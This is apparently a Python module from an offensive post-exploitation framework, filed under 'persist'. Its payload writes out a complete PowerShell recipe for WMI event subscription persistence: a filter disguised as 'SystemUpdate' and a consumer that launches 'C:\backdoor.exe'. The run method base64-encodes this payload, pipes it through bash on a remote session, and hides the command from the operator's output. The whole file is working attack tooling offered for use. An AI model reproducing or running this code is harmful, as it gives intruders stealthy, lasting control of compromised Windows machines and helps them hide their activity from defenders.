"""WMI event subscription persistence."""

from ..base import OperatorScript, ScriptResult


class WMISubscription(OperatorScript):
    """Windows WMI event subscription for persistence."""
    
    name = "WMI Subscription"
    description = "Windows WMI event subscription persistence"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] WMI EVENT SUBSCRIPTION (Windows)"
echo "===================================="
echo ""
echo "[!] This technique works on Windows systems"
echo ""
echo "[+] PowerShell WMI persistence setup:"
cat <<'EOFPS'
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SystemUpdate";
    EventNamespace = "root\cimv2";
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";
}

$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "SystemUpdateConsumer";
    CommandLineTemplate = "C:\backdoor.exe";
}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter;
    Consumer = $Consumer;
}
EOFPS
echo ""
echo "[+] List WMI subscriptions:"
echo '  Get-WmiObject -Namespace root\subscription -Class __EventFilter'
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] WMI subscription info...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="WMI subscription info executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
